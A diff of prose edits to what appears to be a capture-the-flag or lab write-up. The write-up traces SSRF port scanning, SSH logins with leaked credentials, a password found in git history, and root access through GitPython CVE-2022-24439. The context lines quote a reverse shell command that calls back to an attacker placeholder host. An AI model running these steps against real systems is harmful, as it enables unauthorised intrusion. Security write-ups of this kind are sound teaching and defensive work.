@@ -79,7 +79,7 @@ ffuf -u http://<TARGET_HOST><UPLOAD_ENDPOINT> -request ssrf.req -w <(seq 0 65535
 5000  [Status: 200]
 ```
 
-Significance: the server-side fetch reaches loopback, so services bound to the internal interface are exposed through the upload feature.
+Significance: the server-side fetch reaches loopback, so the upload feature exposes services bound to the internal interface.
 
 Result: an internal API service answers on port 5000.
 
@@ -136,7 +136,7 @@ Observation: the recovered credentials fit the exposed SSH service.
 sshpass -p '<DEVELOPMENT_USER_PASSWORD>' ssh <DEVELOPMENT_USER>@<TARGET_HOST>
 ```
 
-The source records this login and the later production-user login as successful without captured session output.
+The source records this login and the later production-user login as successful, but I could not verify either from captured session output.
 
 Significance: authenticated access as the development user provides the home directory that holds the Git repository used in the next stage.
 
@@ -144,7 +144,7 @@ Result: a development-user shell is obtained.
 
 ### 6. Git History Credential Leak
 
-Observation: a Git repository under the development user's home directory contains a reverted production configuration change.
+Observation: I checked the Git history of the repository under the development user's home directory and found a reverted production configuration change.
 
 ```bash
 cd <DEVELOPMENT_HOME>/<REPOSITORY_DIRECTORY> && git log
@@ -175,7 +175,7 @@ Observation: the production credentials fit the same SSH service.
 sshpass -p '<PRODUCTION_USER_PASSWORD>' ssh <PRODUCTION_USER>@<TARGET_HOST>
 ```
 
-Significance: the production account holds the sudo rule that permits root execution, making it the pivot for privilege escalation.
+Significance: the production account holds the sudo rule that permits root execution and is the pivot for privilege escalation.
 
 Result: a production-user shell is obtained.
 
@@ -203,7 +203,7 @@ r = Repo.init('', bare=True)
 r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
 ```
 
-Action: GitPython before 3.1.30 is vulnerable to CVE-2022-24439 — the `ext::` transport runs shell commands, and the wildcard sudo rule permits an arbitrary clone URL.
+Action: GitPython before 3.1.30 is vulnerable to CVE-2022-24439: the `ext::` transport runs shell commands, and the wildcard sudo rule permits an arbitrary clone URL.
 
 ```bash
 echo "bash -i >& /dev/tcp/<ATTACKER_IP>/<LISTEN_PORT> 0>&1" > /tmp/revshell.sh
@@ -220,15 +220,15 @@ root@<TARGET_HOST>:<PRIVILEGED_WORKING_DIRECTORY>#
 
 Significance: the wildcard argument combined with the enabled `ext::` protocol turns a narrow-looking sudo rule into arbitrary root command execution.
 
-Result: a root shell is returned on the callback, confirming the privilege change.
+Result: the callback returned a root shell, which confirms the privilege change.
 
 ## Challenges and Decisions
 
-The source documents no failed attempts or tradeoffs; the exploitation path was linear from SSRF to root, with each stage handing the next one a usable credential or execution context.
+The source documents no failed attempts or tradeoffs; the exploitation path was linear from SSRF to root, and each stage supplied the next with a usable credential or execution context.
 
 ## Outcome: root command execution via sudo-permitted GitPython
 
-The evidence establishes root command execution on the target through a sudo-permitted GitPython script vulnerable to CVE-2022-24439, with the privilege change confirmed by the returned root shell prompt.
+The evidence establishes root command execution on the target through a sudo-permitted GitPython script vulnerable to CVE-2022-24439, and the returned root shell prompt confirms the privilege change.
 
 ## Recommendations: upload SSRF, API credentials, git history, wildcard sudo
 
